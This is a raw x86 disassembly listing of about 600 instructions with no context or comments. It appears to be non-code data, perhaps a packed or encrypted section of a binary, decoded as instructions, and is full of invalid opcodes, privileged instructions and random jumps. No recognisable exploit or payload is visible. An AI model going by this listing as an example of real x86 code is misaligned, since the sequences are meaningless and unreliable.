  418843:	cs inc ebx
  418845:	mov    eax,ds:0x72fc416c
  41884a:	xchg   ebp,eax
  41884b:	fadd   DWORD PTR gs:[ebx+0x71f600fc]
  418852:	sub    al,0xfb
  418854:	or     cl,bh
  418856:	push   0xf930ae4a
  41885b:	and    ecx,DWORD PTR [edi]
  41885d:	cmp    ecx,DWORD PTR [esi]
  41885f:	icebp  
  418860:	or     al,0xbb
  418862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418863:	mov    ds:0x1f2eefb5,eax
  418868:	hlt    
  418869:	mov    WORD PTR [ebp-0x4b],gs
  41886c:	call   0x4729bf04
  418871:	inc    edi
  418872:	rcr    ebp,1
  418874:	sub    BYTE PTR [esi-0x10e9aa24],al
  41887a:	adc    edx,ecx
  41887c:	jecxz  0x41881d
  41887e:	adc    eax,0xb1962724
  418883:	add    eax,0xab82c974
  418888:	bound  edi,QWORD PTR [ebx]
  41888a:	std    
  41888b:	pop    es
  41888c:	jmp    0x4188b9
  41888e:	jge    0x4188ee
  418890:	aad    0x69
  418892:	jecxz  0x41886f
  418894:	sbb    al,0xfb
  418896:	and    ebx,0x94976155
  41889c:	push   eax
  41889d:	pop    edi
  41889e:	or     ecx,eax
  4188a0:	jno    0x418870
  4188a2:	enter  0x640d,0x40
  4188a6:	lea    ebp,[edi-0x7c]
  4188a9:	gs int 0xae
  4188ac:	push   esi
  4188ad:	ins    DWORD PTR es:[edi],dx
  4188ae:	cwde   
  4188af:	in     al,dx
  4188b0:	mov    dl,BYTE PTR [esi-0x41a3e5cf]
  4188b6:	dec    ecx
  4188b7:	sub    cl,BYTE PTR [edi+0x35ad2a14]
  4188bd:	fadd   st(2),st
  4188bf:	add    eax,0x1a851182
  4188c4:	jae    0x418859
  4188c6:	sbb    edi,DWORD PTR [ebx]
  4188c8:	nop
  4188c9:	ja     0x4188fd
  4188cb:	push   edi
  4188cc:	lea    ebp,[edi+ebx*8]
  4188cf:	cmp    DWORD PTR [edi+0x624ec9d3],ebx
  4188d5:	popa   
  4188d6:	daa    
  4188d7:	repnz (bad) 
  4188da:	push   si
  4188dc:	and    eax,0xd028ef8c
  4188e1:	xchg   ecx,eax
  4188e2:	mov    eax,ds:0xdb85221b
  4188e7:	bndldx bnd2,[ebx-0xd]
  4188eb:	push   edx
  4188ec:	jmp    FWORD PTR [ebx-0x75]
  4188ef:	push   esi
  4188f0:	xchg   ebx,eax
  4188f1:	pushf  
  4188f2:	push   es
  4188f3:	in     eax,0x61
  4188f5:	int    0x13
  4188f7:	int    0x98
  4188f9:	fild   QWORD PTR [ebx]
  4188fb:	lock adc edx,DWORD PTR [edx]
  4188fe:	sub    edi,DWORD PTR fs:[eax-0x19]
  418902:	cld    
  418903:	mov    dh,0x9d
  418905:	dec    eax
  418906:	pop    ds
  418907:	xor    bl,BYTE PTR [ebx-0x59]
  41890a:	mov    esp,0xe700e9d1
  41890f:	cmp    dh,0xea
  418912:	pop    ss
  418913:	jmp    0x9e68:0x9df3544a
  41891a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41891b:	aam    0x89
  41891d:	(bad)  
  41891e:	fistp  DWORD PTR [eax]
  418920:	adc    eax,0x85c64ec1
  418925:	and    eax,0xf5c52047
  41892a:	lods   eax,DWORD PTR ds:[esi]
  41892b:	cli    
  41892c:	push   edi
  41892d:	test   ch,0x7e
  418930:	sti    
  418931:	wbinvd 
  418933:	pop    ebp
  418934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418935:	and    al,0x57
  418937:	sbb    DWORD PTR [ebx-0x16bf64b6],edi
  41893d:	xchg   edx,eax
  41893e:	push   es
  41893f:	enter  0x6eca,0xc2
  418943:	and    BYTE PTR [eax],bh
  418945:	cdq    
  418946:	mov    esp,0x12477895
  41894b:	xor    DWORD PTR [ecx],0x6a7cb2b4
  418951:	xor    BYTE PTR [edi],dl
  418953:	stos   DWORD PTR es:[edi],eax
  418954:	hlt    
  418955:	lods   al,BYTE PTR ds:[esi]
  418956:	out    dx,eax
  418957:	adc    al,0x96
  418959:	mov    dl,0x47
  41895b:	dec    edx
  41895c:	pop    ds
  41895d:	xchg   esi,eax
  41895e:	setns  BYTE PTR [esi+0x15]
  418962:	sbb    ch,BYTE PTR [ecx-0xde3f62c]
  418968:	ret    
  418969:	jmp    FWORD PTR [ebp-0x28]
  41896c:	leave  
  41896d:	adc    dl,bl
  41896f:	test   edx,eax
  418971:	jae    0x4189a8
  418973:	xchg   edi,eax
  418974:	outs   dx,DWORD PTR ss:[esi]
  418976:	arpl   cx,ax
  418978:	add    esp,DWORD PTR [esi-0x478f096e]
  41897e:	add    dl,0x49
  418981:	fld    DWORD PTR [edx-0x3c]
  418984:	mov    cs,WORD PTR [edi-0x65ec04b4]
  41898a:	or     BYTE PTR [edx+ebx*4+0x23],dl
  41898e:	loope  0x418946
  418990:	gs mov edx,0x1dc05b02
  418996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418997:	ja     0x4189de
  418999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41899a:	pop    edx
  41899b:	in     al,0x78
  41899d:	inc    edx
  41899e:	mov    al,0x44
  4189a1:	pop    esi
  4189a2:	sti    
  4189a3:	dec    ebx
  4189a4:	sti    
  4189a5:	cmp    ch,ah
  4189a7:	cdq    
  4189a8:	xor    ecx,DWORD PTR [edx+0x1e30d179]
  4189ae:	pop    es
  4189af:	or     esp,DWORD PTR [ebx]
  4189b1:	test   DWORD PTR [eax],0x1d380804
  4189b7:	xchg   ecx,eax
  4189b8:	mov    esi,0x98c0870
  4189bd:	imul   eax,DWORD PTR [ebp-0x2cc1ef0f],0x57237196
  4189c7:	xchg   ecx,eax
  4189c8:	mov    dl,0xea
  4189ca:	in     eax,dx
  4189cb:	ja     0x41895f
  4189cd:	mov    ds:0xbeaecba1,eax
  4189d2:	jg     0x418a11
  4189d4:	sub    ch,BYTE PTR [eax+0x1f]
  4189d7:	sub    BYTE PTR [edi+0x9],cl
  4189da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189db:	jg     0x4189de
  4189dd:	cmp    eax,0x9d147c48
  4189e2:	clc    
  4189e3:	stos   DWORD PTR es:[edi],eax
  4189e4:	jo     0x418983
  4189e6:	push   ebp
  4189e7:	push   eax
  4189e8:	pop    DWORD PTR [edx+eiz*2-0x2de6f53b]
  4189ef:	push   ebx
  4189f0:	jne    0x418a3a
  4189f2:	repz mov ds:0x627903eb,al
  4189f8:	mov    ds:0x65a42062,al
  4189fd:	xor    ch,BYTE PTR [ebx-0x59cede57]
  418a03:	out    0x9c,eax
  418a05:	test   BYTE PTR [edx-0x19],0xd
  418a09:	or     DWORD PTR cs:[eax+esi*2+0x78],ecx
  418a0e:	sbb    ecx,DWORD PTR [eax-0x2528046a]
  418a14:	repnz icebp 
  418a16:	mov    ah,0x51
  418a18:	xor    eax,0x7d2da3be
  418a1d:	int    0x5c
  418a1f:	adc    DWORD PTR [ebp-0x297f5cb0],0x65
  418a26:	lds    esp,FWORD PTR [esi-0x73]
  418a29:	adc    ebx,esi
  418a2b:	mov    esp,0xdaaddba3
  418a30:	xchg   bh,dh
  418a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a33:	and    al,0x22
  418a35:	cdq    
  418a36:	stos   DWORD PTR es:[edi],eax
  418a37:	push   es
  418a38:	lds    esp,FWORD PTR [ebx]
  418a3a:	mov    bh,0x67
  418a3c:	in     eax,dx
  418a3d:	lahf   
  418a3e:	dec    ecx
  418a3f:	push   0x21
  418a41:	mov    esp,ecx
  418a43:	ins    BYTE PTR es:[edi],dx
  418a44:	pop    esi
  418a45:	fidivr WORD PTR [ecx+0x4f]
  418a48:	pop    ebp
  418a49:	sbb    al,0x14
  418a4b:	push   eax
  418a4c:	and    eax,0x74932db5
  418a51:	out    0x4b,eax
  418a53:	mov    ebx,0xc9ae2da5
  418a58:	and    al,0xcf
  418a5a:	push   0xffffff8b
  418a5c:	push   0xc7d430b0
  418a61:	ins    DWORD PTR es:[edi],dx
  418a62:	cld    
  418a63:	pusha  
  418a64:	out    0x2b,eax
  418a66:	adc    eax,0xbc99e136
  418a6b:	(bad)  
  418a6c:	xor    bl,BYTE PTR [esi+0x4e]
  418a6f:	xchg   BYTE PTR [eax+0x58],dh
  418a72:	mov    WORD PTR [ecx-0x39],?
  418a75:	xchg   edi,eax
  418a76:	rol    DWORD PTR [eax+0xc],cl
  418a79:	add    ebx,DWORD PTR [ecx]
  418a7b:	out    0xb8,al
  418a7d:	jns    0x418a96
  418a7f:	(bad)  
  418a80:	cmp    edi,esp
  418a82:	repnz dec ecx
  418a84:	or     bl,BYTE PTR [eax]
  418a86:	fnsave [eax-0x1d812b6a]
  418a8c:	push   ebp
  418a8d:	aam    0x31
  418a8f:	adc    eax,0x17c8bfd7
  418a94:	lock addr16 in al,dx
  418a97:	arpl   sp,sp
  418a99:	out    dx,eax
  418a9a:	adc    eax,0xf20ef30d
  418a9f:	(bad)  
  418aa0:	cmp    al,0xd0
  418aa2:	jge    0x418a5f
  418aa4:	jmp    0x56d9af27
  418aa9:	fimul  WORD PTR [ebp-0x7a007057]
  418aaf:	mov    esp,0x816a686
  418ab4:	inc    ebp
  418ab5:	add    BYTE PTR [ebp+0x20537dc6],ah
  418abb:	xchg   ebp,eax
  418abc:	(bad)  
  418abd:	push   ss
  418abe:	cmp    al,0x8f
  418ac0:	das    
  418ac1:	xor    edi,0x2c8acfec
  418ac7:	adc    eax,0x895aa106
  418acc:	mov    ah,0xab
  418ace:	cmp    ah,BYTE PTR [ebx+0x47]
  418ad1:	in     al,dx
  418ad2:	mov    edi,0x2a6518c0
  418ad7:	mov    dh,0x81
  418ad9:	xchg   ecx,eax
  418ada:	sub    eax,DWORD PTR [edx-0x5347599f]
  418ae0:	stos   DWORD PTR es:[edi],eax
  418ae1:	hlt    
  418ae2:	(bad)  
  418ae5:	xor    BYTE PTR [ecx+0x42f826b6],ch
  418aeb:	jg     0x418a6e
  418aed:	repnz fmul st(3),st
  418af0:	fld    DWORD PTR [edi+0x7f]
  418af3:	jno    0x418a8f
  418af5:	sar    edx,0x2
  418af8:	mov    eax,0x291039cc
  418afd:	leave  
  418afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aff:	or     ecx,DWORD PTR [eax+0x1eb9cd97]
  418b05:	in     al,0x14
  418b07:	sbb    al,0x72
  418b09:	test   al,0xf8
  418b0b:	cmp    al,0xf7
  418b0d:	aam    0x81
  418b0f:	sbb    al,0x83
  418b11:	lock pop ecx
  418b13:	aaa    
  418b14:	xchg   ecx,eax
  418b15:	sbb    dh,BYTE PTR [eax-0x28]
  418b18:	enter  0x2c6f,0xc2
  418b1c:	ret    
  418b1d:	ret    0x8b7
  418b20:	add    BYTE PTR [ebp+0x680d966],bl
  418b26:	cmp    DWORD PTR [edx+0x5a],ecx
  418b29:	mov    es:0x1a54836f,eax
  418b2f:	mov    cl,0x6d
  418b31:	inc    esp
  418b32:	(bad)  [edi+0x6dcb41c4]
  418b38:	mov    dl,0x9e
  418b3a:	mov    ds:0x2464cdde,eax
  418b3f:	inc    esp
  418b40:	jge    0x418bbd
  418b42:	out    dx,al
  418b43:	sbb    ah,ch
  418b45:	sub    ebx,esi
  418b47:	push   ebx
  418b48:	mov    edx,0x2704146e
  418b4d:	add    ebp,ebp
  418b4f:	stos   DWORD PTR es:[edi],eax
  418b50:	mov    edi,DWORD PTR [esi-0x19]
  418b53:	js     0x418b0f
  418b55:	pop    esi
  418b56:	xchg   esi,eax
  418b57:	and    dl,BYTE PTR [eax-0x79baf10a]
  418b5d:	mov    bh,0xec
  418b5f:	pushf  
  418b60:	js     0x418bbf
  418b62:	jmp    FWORD PTR [ecx-0x4a]
  418b65:	add    eax,0x7341142c
  418b6a:	mov    bh,0x2f
  418b6c:	mov    eax,ds:0x99f752d3
  418b71:	xor    BYTE PTR [eax-0x41ec8201],ah
  418b77:	stc    
  418b78:	jnp    0x418b99
  418b7a:	push   ecx
  418b7b:	push   edx
  418b7c:	fdivr  st(0),st
  418b7e:	inc    ebp
  418b7f:	in     al,dx
  418b80:	(bad)  
  418b83:	inc    ebx
  418b84:	mov    ecx,0x5a5444a8
  418b89:	inc    edi
  418b8a:	sbb    al,0x20
  418b8c:	dec    ebp
  418b8d:	inc    esi
  418b8e:	(bad)  
  418b8f:	sahf   
  418b90:	or     eax,0xf0a5818a
  418b95:	pop    edi
  418b96:	jge    0x418b1d
  418b98:	arpl   sp,cx
  418b9a:	dec    edx
  418b9b:	jnp    0x418b4b
  418b9d:	jg     0x418b74
  418b9f:	std    
  418ba0:	inc    ebp
  418ba1:	popf   
  418ba2:	jo     0x418b32
  418ba4:	dec    edx
  418ba5:	adc    DWORD PTR [ebx+0x4475aa51],esp
  418bab:	retf   0x92bb
  418bae:	loope  0x418c0d
  418bb0:	push   ebp
  418bb1:	add    BYTE PTR [esi],ch
  418bb3:	mov    ebp,0x1dd326f
  418bb8:	loopne 0x418ba1
  418bba:	retf   0x15d4
  418bbd:	push   0xffffff86
  418bbf:	jno    0x418bb0
  418bc1:	push   ebp
  418bc2:	jmp    DWORD PTR [edx]
  418bc4:	sub    edi,eax
  418bc6:	(bad)  
  418bc7:	mov    edi,0x69115c36
  418bcc:	out    0x24,al
  418bce:	mov    al,0xef
  418bd0:	pop    edi
  418bd1:	cdq    
  418bd2:	hlt    
  418bd3:	pop    ebx
  418bd4:	mov    al,0x43
  418bd6:	repnz add al,0xd5
  418bd9:	adc    esp,DWORD PTR [edx-0x22]
  418bdc:	gs or  eax,DWORD PTR ds:[ebx]
  418be0:	aam    0xce
  418be2:	cmp    al,0xca
  418be4:	out    0x79,al
  418be6:	xor    BYTE PTR [di+0x79],0xfc
  418beb:	dec    edi
  418bec:	pop    edi
  418bed:	sub    BYTE PTR [edx],bh
  418bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bf0:	stc    
  418bf1:	pop    ss
  418bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf3:	add    DWORD PTR ds:0xc7422c6d,0xffffff8b
  418bfa:	xchg   ecx,eax
  418bfb:	lods   al,BYTE PTR ds:[esi]
  418bfc:	addr16 inc ecx
  418bfe:	scas   al,BYTE PTR es:[edi]
  418bff:	add    al,dl
  418c01:	outs   dx,BYTE PTR ds:[esi]
  418c02:	mov    ch,0xba
  418c04:	xor    BYTE PTR [eax-0x80],dh
  418c07:	mov    ecx,0x7656274
  418c0c:	int    0x31
  418c0e:	mov    ds:0x90904cba,al
  418c13:	aaa    
  418c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c15:	mov    esp,0x68c43fca
  418c1a:	divps  xmm0,XMMWORD PTR [edx-0x22]
  418c1e:	push   ss
  418c1f:	out    dx,al
  418c20:	xchg   esi,eax
  418c21:	dec    ebp
  418c22:	mov    eax,ds:0xe7216c
  418c27:	sbb    ch,BYTE PTR [edi+ebp*1]
  418c2a:	pop    ecx
  418c2b:	in     eax,dx
  418c2c:	aaa    
  418c2d:	dec    esp
  418c2e:	push   es
  418c2f:	pusha  
  418c30:	inc    ecx
  418c31:	subps  xmm5,XMMWORD PTR ds:0x308b6006
  418c38:	ins    DWORD PTR es:[edi],dx
  418c39:	das    
  418c3a:	push   edi
  418c3b:	push   eax
  418c3c:	addr16 push esi
  418c3e:	test   DWORD PTR [edx-0x7252894d],esi
  418c44:	shl    DWORD PTR [ecx-0xe],1
  418c47:	sbb    ebp,DWORD PTR [ebx]
  418c49:	nop
  418c4a:	sub    eax,0xc79f3aa7
  418c4f:	mov    eax,0x67ed7450
  418c54:	push   cs
  418c55:	imul   edx,DWORD PTR [eax-0xc],0x5644c5b6
  418c5c:	cmp    bh,BYTE PTR ds:0x500d136e
  418c62:	jnp    0x418ca5
  418c64:	mov    cs,WORD PTR ds:0x122e3d1f
  418c6a:	repz mov dh,0xef
  418c6d:	shr    BYTE PTR [ebx+0x2c53f62d],1
  418c73:	div    BYTE PTR [edi-0x63cad242]
  418c79:	xchg   edx,eax
  418c7a:	inc    edx
  418c7b:	inc    edi
  418c7c:	xchg   edi,eax
  418c7d:	xor    al,0xa2
  418c7f:	cld    
  418c80:	cld    
  418c81:	mov    bl,0xd8
  418c83:	mov    al,0xd
  418c85:	mov    ebx,0xd6b7920
  418c8a:	jmp    0x418c1c
  418c8c:	shl    BYTE PTR [ebx-0x28],1
  418c8f:	lods   eax,DWORD PTR ds:[esi]
  418c90:	aam    0xbc
  418c92:	add    BYTE PTR [ebx-0x10],ah
  418c95:	jge    0x418c21
  418c97:	out    0x78,eax
  418c99:	pop    esp
  418c9a:	dec    esi
  418c9b:	imul   ebx,DWORD PTR es:[ecx],0xf43267c2
  418ca2:	pop    edi
  418ca3:	xchg   ebp,eax
  418ca4:	fsub   DWORD PTR [esi]
  418ca6:	xchg   ecx,eax
  418ca7:	int    0xc5
  418ca9:	mov    esi,0xad462fd1
  418cae:	sti    
  418caf:	sub    BYTE PTR [edx-0x7b],al
  418cb2:	arpl   WORD PTR [eax+0x75],bx
  418cb5:	or     DWORD PTR [esi-0x30],0xffffffa0
  418cb9:	test   eax,0xee55b7c9
  418cbe:	idiv   DWORD PTR [ebp+eiz*1+0x67]
  418cc2:	fisttp DWORD PTR ds:0x4dabcefb
  418cc8:	xlat   BYTE PTR ds:[ebx]
  418cc9:	int    0x2d
  418ccb:	add    edi,ecx
  418ccd:	aad    0x67
  418ccf:	pop    es
  418cd0:	jl     0x418cb7
  418cd2:	daa    
  418cd3:	mov    esi,0x50caa9eb
  418cd8:	retf   0x869c
  418cdb:	jmp    FWORD PTR [eax]
  418cdd:	lahf   
  418cde:	sbb    bh,BYTE PTR [edi-0x35b6471]
  418ce4:	leave  
  418ce5:	mov    ebx,0x28966d47
  418cea:	push   cs
  418ceb:	arpl   WORD PTR [esi],si
  418ced:	sbb    dl,BYTE PTR [edi]
  418cef:	add    al,0x86
  418cf1:	fidiv  DWORD PTR [ebx]
  418cf3:	addr16 dec eax
  418cf5:	mov    bl,0x2b
  418cf7:	into   
  418cf8:	xchg   eax,edi
  418cfa:	dec    ecx
  418cfb:	popf   
  418cfc:	pusha  
  418cfd:	out    dx,al
  418cfe:	add    esi,0x1fda4a28
  418d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d05:	mov    DWORD PTR [esi-0x5daa5f42],ecx
  418d0b:	das    
  418d0c:	pop    ds
  418d0d:	cwde   
  418d0e:	xor    al,0xf8
  418d10:	dec    esp
  418d11:	imul   edi,ecx,0x301176b9
  418d17:	or     DWORD PTR [ebp+0x74a1c1db],ecx
  418d1d:	call   0x86a6:0x6969dc11
  418d24:	inc    ebx
  418d25:	xchg   edx,eax
  418d26:	jge    0x418cbc
  418d28:	aas    
  418d29:	dec    esp
  418d2a:	mov    al,ds:0x597f62ff
  418d2f:	push   es
  418d30:	loop   0x418daa
  418d32:	inc    eax
  418d33:	cmp    eax,0xf4eb6c33
  418d38:	cli    
  418d39:	mov    esp,DWORD PTR [esi+0x12]
  418d3c:	adc    ebp,eax
  418d3e:	cld    
  418d3f:	push   0x41
  418d41:	clc    
  418d42:	(bad)  
  418d44:	arpl   WORD PTR [edx+0x1f3058e1],bx
  418d4a:	in     al,0x5c
  418d4c:	xchg   ebp,eax
  418d4d:	jmp    0xc25ab2f1
  418d52:	aad    0xe7
  418d54:	mov    ch,0xa3
  418d56:	mov    ss,esi
  418d58:	mov    WORD PTR [ebx+0x5986660d],?
  418d5e:	mov    cl,0x47
  418d60:	jg     0x418db7
  418d62:	mov    ecx,0x7e0119d5
  418d67:	jg     0x418d60
  418d69:	ss pop esp
  418d6b:	mov    fs,WORD PTR [ebx+ecx*1-0x79]
  418d6f:	sar    DWORD PTR [eax],1
  418d71:	stc    
  418d72:	data16 cmc 
  418d74:	repnz std 
  418d76:	cmp    DWORD PTR [edi+esi*2-0x549edd59],0xffffffd6
  418d7e:	sbb    al,0x91
  418d80:	mov    esi,0x3d15c8ac
  418d85:	std    
  418d86:	add    DWORD PTR [esi],edi
  418d88:	push   ebx
  418d89:	mov    edi,0x469601da
  418d8e:	cmp    BYTE PTR [eax],bl
  418d90:	mov    esp,0xc6853528
  418d95:	push   ebp
  418d96:	mov    dh,0xab
  418d98:	dec    ebx
  418d99:	push   esi
  418d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d9b:	mov    eax,0xd0693ea9
  418da0:	xchg   edi,ecx
  418da2:	ret    0x77db
  418da5:	cmp    BYTE PTR [esi+eiz*4-0x6c],0x7a
  418daa:	lea    ebp,[edx-0x1406473]
  418db0:	aaa    
  418db1:	sti    
  418db2:	xor    eax,0x8b6d9298
  418db7:	xchg   ebp,eax
  418db8:	or     al,0x4b
  418dba:	and    DWORD PTR ss:[ecx+0x70514a8f],ebx
  418dc1:	in     al,0x5a
  418dc3:	push   ebp
  418dc4:	jmp    0x5333e9d7
  418dc9:	add    al,0xae
  418dcb:	cmp    BYTE PTR [esp+ecx*1+0x7999ea02],0xf1
  418dd3:	repz add DWORD PTR [edi],eax
  418dd6:	int3   
  418dd7:	xchg   BYTE PTR [esi-0x2b],al
  418dda:	fiadd  DWORD PTR [eax]
  418ddc:	xchg   esi,eax
  418ddd:	cmp    al,0xe6
  418ddf:	retf   0xe63f
  418de2:	fcomp  DWORD PTR [ebp+0x5a54c646]
  418de8:	aam    0x1
  418dea:	and    BYTE PTR [esi-0xdeb50ec],ah
  418df0:	and    esi,DWORD PTR [eax-0x4033face]
  418df6:	and    DWORD PTR ds:0x59545c73,edi
  418dfc:	sbb    eax,0x29abd8db
  418e01:	mov    dh,BYTE PTR [ebp+0x7a]
  418e04:	sbb    ebx,DWORD PTR ds:0x4a1f6ff6
  418e0a:	in     al,dx
  418e0b:	mov    dh,cl
  418e0d:	push   edx
  418e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e0f:	cwde   
  418e10:	cmc    
  418e11:	lahf   
  418e12:	mov    al,0xea
  418e14:	iret   
  418e15:	mov    bh,0xfd
  418e17:	xchg   edi,eax
  418e18:	int3   
  418e19:	je     0x418e5b
  418e1b:	outs   dx,DWORD PTR ds:[esi]
  418e1c:	inc    esi
  418e1d:	dec    esp
  418e1e:	lods   eax,DWORD PTR ds:[esi]
  418e1f:	lods   eax,DWORD PTR ds:[esi]
  418e20:	retf   0x6889
  418e23:	jl     0x418db0
  418e25:	pushf  
  418e26:	fisttp QWORD PTR [esi]
  418e28:	enter  0xcb57,0x94
  418e2c:	mov    edx,0xb2c1d7c9
  418e31:	mov    dl,BYTE PTR [ecx-0x546d1732]
  418e37:	push   es
  418e38:	fld    QWORD PTR [ecx]
  418e3a:	mov    ds:0xc89ffaab,eax
  418e3f:	pop    esp
  418e40:	dec    esi
  418e41:	adc    edx,DWORD PTR [edx+0x75]
  418e44:	inc    edi
  418e45:	bts    DWORD PTR ds:0x5306cca5,ebp
  418e4c:	jge    0x418e0e
  418e4e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e50:	and    ebx,DWORD PTR [esi+0x7b]
  418e53:	jecxz  0x418e52
  418e55:	sub    al,BYTE PTR [ebx-0x5d]
  418e58:	adc    ebx,DWORD PTR [eax]
  418e5a:	add    al,0x4d
  418e5c:	pop    edi
  418e5d:	jp     0x418e80
  418e5f:	mov    al,es:0x599a4829
  418e65:	or     ah,BYTE PTR [ebx-0x23]
  418e68:	inc    esi
  418e69:	mov    ds:0x5678e47a,al
  418e6e:	outs   dx,BYTE PTR ds:[esi]
  418e6f:	or     BYTE PTR [ecx-0x7f856848],ah
  418e75:	cmp    DWORD PTR [ecx-0x65],ecx
  418e78:	jns    0x418e29
  418e7a:	mov    ds:0x9c6bec05,al
  418e7f:	out    dx,eax
  418e80:	(bad)  [eax]
  418e82:	loope  0x418ef5
  418e84:	repz test DWORD PTR [edi-0x5],esi
  418e88:	retf   0xc335
  418e8b:	out    dx,al
  418e8c:	sub    eax,0xec70d316
  418e91:	cmp    al,0xdc
  418e93:	outs   dx,DWORD PTR ds:[esi]
  418e94:	js     0x418e16
  418e96:	inc    ebp
  418e97:	push   ebp
  418e98:	les    esi,FWORD PTR [eax]
  418e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e9b:	xchg   esi,eax
  418e9c:	or     BYTE PTR [edx-0x1],dh
  418e9f:	fdivr  DWORD PTR [edx-0x7e]
  418ea2:	and    DWORD PTR [ebx-0xfa6a93f],edi
  418ea8:	out    dx,al
  418ea9:	retf   0x185b
  418eac:	lds    edx,FWORD PTR [esi-0x64545ba0]
  418eb2:	sub    eax,0x29b9a537
  418eb7:	jo     0x418e53
  418eb9:	push   edi
  418eba:	cdq    
  418ebb:	es loopne 0x418edd
  418ebe:	and    DWORD PTR [ebp-0x3c1b6b66],edi
  418ec4:	sbb    DWORD PTR [ebx],0x63e36c57
  418eca:	xchg   DWORD PTR [esi+edx*4-0x309bbb72],esi
  418ed1:	je     0x418f31
  418ed3:	jo     0x418f01
  418ed5:	or     eax,0x15946d2
  418eda:	inc    esp
  418edb:	xchg   DWORD PTR [ecx],edi
  418edd:	fdiv   DWORD PTR [edx+eiz*2]
  418ee0:	das    
  418ee1:	pop    DWORD PTR [ecx]
  418ee3:	int3   
  418ee4:	ficomp DWORD PTR [ebx+eiz*1]
  418ee7:	adc    bl,bl
  418ee9:	sub    eax,esi
  418eeb:	inc    esp
  418eec:	jp     0x418ed4
  418eee:	and    al,0xff
  418ef0:	nop
  418ef1:	inc    ecx
  418ef2:	pop    edx
  418ef3:	or     BYTE PTR [ecx+0x5ef28133],al
  418ef9:	jecxz  0x418f50
  418efb:	std    
  418efc:	loopne 0x418efb
  418efe:	jns    0x418ee5
  418f00:	(bad)  
  418f02:	leave  
  418f03:	dec    DWORD PTR [edx-0x3501c914]
  418f09:	cdq    
  418f0a:	loope  0x418f42
  418f0c:	ss test esp,eax
  418f0f:	inc    esi
  418f10:	(bad)  
  418f11:	and    BYTE PTR [ebx],al
  418f13:	pop    ss
  418f14:	gs sub al,0x43
  418f17:	jg     0x418f6d
  418f19:	mov    WORD PTR [ebp-0x15ffa032],ss
  418f1f:	or     ecx,DWORD PTR [esi]
  418f21:	jge    0x418eea
  418f23:	pushf  
  418f24:	out    0x9,eax
  418f26:	out    dx,al
  418f27:	int3   
  418f28:	arpl   WORD PTR ds:0xf4bf05fd,bp
  418f2e:	rol    BYTE PTR [ecx],0x94
  418f31:	xor    al,BYTE PTR [edx-0x4a]
  418f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f35:	inc    edi
  418f36:	jmp    0xe876:0x28ea44d2
  418f3d:	out    0x60,eax
  418f3f:	nop
  418f40:	mov    BYTE PTR [ebx-0x67],ch
  418f43:	mov    ah,0x5f
  418f45:	sbb    BYTE PTR [ebp+eiz*2-0x12],ch
  418f49:	out    0xe0,al
  418f4b:	into   
  418f4c:	jne    0x418f61
  418f4e:	scas   al,BYTE PTR es:[edi]
  418f4f:	add    esi,DWORD PTR [ebp+0x7585ce5c]
  418f55:	shl    BYTE PTR [ebp+0x3e],0x86
  418f59:	aaa    
  418f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f5b:	ret    
  418f5c:	and    eax,0x9be598fb
  418f61:	mov    bh,0x8
  418f63:	push   0x4f2e2fd7
  418f68:	das    
  418f69:	jp     0x418f3a
  418f6b:	out    0x9c,eax
  418f6d:	stos   DWORD PTR es:[edi],eax
  418f6e:	lods   al,BYTE PTR ds:[esi]
  418f6f:	sbb    al,0xa2
  418f71:	sbb    ebp,DWORD PTR [edx+eiz*8+0x17505ae5]
  418f78:	pop    es
  418f79:	xlat   BYTE PTR ds:[ebx]
  418f7a:	sti    
  418f7b:	lods   al,BYTE PTR ds:[esi]
  418f7c:	ins    BYTE PTR es:[edi],dx
  418f7d:	lods   al,BYTE PTR ds:[esi]
  418f7e:	xlat   BYTE PTR ds:[ebx]
  418f7f:	ds inc ebp
  418f81:	ror    BYTE PTR ss:[edx],1
  418f84:	pop    esp
  418f85:	out    0x71,al
  418f87:	mov    al,0xdf
  418f89:	mov    esp,0x58e13013
  418f8e:	mov    eax,ds:0xecf28545
  418f93:	jae    0x418fbb
  418f95:	xchg   ebp,eax
  418f96:	dec    esp
  418f97:	(bad)  
  418f98:	mov    ch,0x58
  418f9a:	jo     0x418f58
  418f9c:	push   ss
  418f9d:	or     ecx,DWORD PTR [ebx+0xb]
  418fa0:	pop    esp
  418fa1:	xchg   edi,eax
  418fa2:	sahf   
  418fa3:	xchg   edx,eax
  418fa4:	imul   edi,esi,0xffffff8c
  418fa7:	jmp    0x418f5e
  418fa9:	imul   esi,DWORD PTR [edx-0x185acaf5],0x3c
  418fb0:	dec    esi
  418fb1:	pop    edi
  418fb2:	call   0x7deb00bd
  418fb7:	add    DWORD PTR [eax-0x79bd69d5],edi
  418fbd:	popa   
  418fbe:	jbe    0x418f4e
  418fc0:	in     al,dx
  418fc1:	loope  0x419010
  418fc3:	jbe    0x418f8f
  418fc5:	adc    ch,ah
  418fc7:	pop    ebx
  418fc8:	jge    0x418fbb
  418fca:	addr16 popa 
  418fcc:	push   edx
  418fcd:	add    eax,0xfe11aaae
  418fd2:	(bad)  
  418fd3:	xchg   ecx,eax
  418fd4:	xchg   esi,eax
  418fd5:	loope  0x418fc0
  418fd7:	test   BYTE PTR [edi-0x5c],bh
  418fda:	mov    esi,0x2ade8f71
  418fdf:	aaa    
  418fe0:	bound  ebx,QWORD PTR cs:[esi]
  418fe3:	push   esi
  418fe4:	rcr    DWORD PTR [ebp-0x4c],0x5a
  418fe8:	jl     0x418fa0
